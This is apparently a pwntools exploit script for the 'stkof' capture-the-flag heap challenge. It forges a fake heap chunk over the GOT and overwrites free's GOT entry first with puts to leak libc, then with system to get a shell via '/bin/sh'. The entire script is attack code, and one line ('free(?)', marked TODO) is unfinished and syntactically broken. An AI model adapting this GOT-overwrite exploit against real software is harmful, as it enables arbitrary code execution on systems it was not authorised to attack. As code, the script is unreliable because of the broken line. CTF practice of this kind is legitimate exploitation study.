from pwn import *

context.log_level = 'debug'

r = process('./stkof')
elf = ELF('./stkof')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

#system_plt = elf.plt['system']
#print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
puts_plt = elf.plt['puts']
print 'puts_plt= ' + hex(puts_plt)
puts_got = elf.got['puts']
print 'puts_got= ' + hex(puts_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)

def add(size):
  r.sendline('1')
  r.sendline(str(size))
  r.recvuntil('\n')
  r.recvuntil('\n')

def free(index):
  r.sendline('3')
  r.sendline(str(index))
  data = r.recvuntil('\n', drop = True)
  return data

def edit(index, content):
  r.sendline('2')
  r.sendline(str(index))
  r.sendline(str(len(content)))
  r.send(content)
  r.recvuntil('\n')

def exp():

  add(0x10)  # 1
  add(0x50)  # 2

  free(2)
  payload = '/bin/sh'
  payload = payload.ljust(0x18, '\0') + p64(0x411) # system automatically malloc 0x410 when no setbuf called
  payload = payload.ljust(0x10 + 0x410 + 0x8, '\0') + p64(0x61) + p64(fake_chunk)

  edit(1, payload) # overwrite 1
  add(0x50)  # 3
  add(0x50)  # 4 fake_chunk

  payload = '\0' * (free_got - (fake_chunk + 0x10)) + p64(puts_plt)
  edit(4, payload) # replace free_got with puts_plt
#  gdb.attach(r)
  data = free(?)  # TODO need to leak any of got item
  data = r.recvuntil('\n', drop=True)
  puts_addr = u64(data + '\0' * 2)
  print 'puts_addr= ' + hex(puts_addr)
  
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  system_addr = puts_addr + (libc.symbols['system'] - libc.symbols['puts'])
  print 'system_addr= ' + hex(system_addr)
  
  #replace free_got with system_addr, could NOT direct replace with system_plt, because system_got is not yet initialized, but 0x602000 has already been broken!!!
  payload = p64(system_addr).rjust(free_got - (fake_chunk + 0x8), '\0') #0x10 - 0x8, rjust need to minus 0x8!!!
  edit(4, payload) # replace free_got with system_addr
  free(1)
  
  r.interactive()


if __name__ == '__main__':
  exp()
